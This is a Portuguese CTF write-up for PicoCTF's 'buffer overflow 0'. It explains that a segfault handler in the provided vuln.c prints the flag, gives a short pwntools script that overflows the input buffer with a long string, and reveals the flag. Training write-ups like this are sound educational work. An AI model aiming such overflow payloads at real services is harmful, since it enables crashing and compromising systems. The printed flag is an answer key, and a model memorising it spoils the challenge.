# WriteUp: buffer overflow 0
## Descrição do Desafio:
**Autor**: Alex Fulton / Palash Oswal \
**Plataforma**: [PicoCTF](https://play.picoctf.org/practice/challenge/257?category=6&page=2) \
**Categoria**: Binary Exploitation \
**Dificuldade**: Média \
**Data**: 2022 \
**Descrição**:
> Let's start off simple, can you overflow the correct buffer?

## Passo a Passo da Solução
### 1. Análise do arquivo fornecido
O próprio desafio já fornece o arquivo fonte, `vuln.c`. Não há muito o que ver neste arquivo, nele podemos identificar vulnerabilidades de `buffer overflow`, mas a principal coisa a se notar é o seguinte trecho de código:

{% code title="vuln.c" overflow="wrap" lineNumbers="true" %}

```c
signal(SIGSEGV, sigsegv_handler);
```

{% endcode %}

Este trecho está dizendo que quando ocorrer um evento de `SIGSEGV`, *segmentation fault*, é para a função `sigsegv_handler` ser chamada. Dando uma olhada nessa função podemos ver que ela imprime a **flag** para nós.

{% code title="vuln.c" overflow="wrap" lineNumbers="true" %}

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```

{% endcode %}

### 2. Solução
Como dito anteriormente, o código está cheio de vulnerabilidades de `buffer overflow`, então se estourarmos qualquer *buffer*, causamos um erro de *segmentation fault* e a **flag** é popada para nós.

### 2.1 Solução com Python

{% code title="solve.py" overflow="wrap" lineNumbers="true" %}

```py
from pwn import *

p = remote(ip, porta) //Troque pelos valores fornecidos.

payload = "sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss"

p.sendlineafter(b"Input: ", payload)

print(p.recvline().decode())
```

{% endcode %}

### Flag
`picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}`

## Autor da WriteUp
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)
